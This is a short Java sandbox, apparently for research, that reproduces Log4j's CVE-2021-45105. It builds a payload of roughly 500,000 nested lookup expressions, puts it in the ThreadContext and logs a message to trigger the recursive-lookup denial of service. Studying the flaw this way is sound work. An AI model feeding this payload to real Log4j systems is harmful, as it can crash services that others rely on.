package eu.righettod;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

/**
 * Sandbox for CVE-2021-45105 study.
 * @see "https://issues.apache.org/jira/browse/LOG4J2-3230"
 * @see "https://github.com/righettod/log4shell-analysis/issues/4"
 */
public class Sandbox45105 {
    public static void main(String[] args) throws Exception {
        Logger log = LogManager.getLogger(Sandbox45105.class);
        System.out.printf("LOG4J2 version: %s\n", log.getClass().getPackage().getImplementationVersion());
        System.out.printf("Java version  : %s\n", System.getProperty("java.version"));
        StringBuilder payload = new StringBuilder("${");
        int occurrences = 500000;
        payload.append("${::-".repeat(occurrences));
        payload.append("$${::-j}");
        payload.append("}".repeat(occurrences));
        payload.append("}");
        ThreadContext.put("test",payload.toString());
        log.info("triggering...");
    }
}
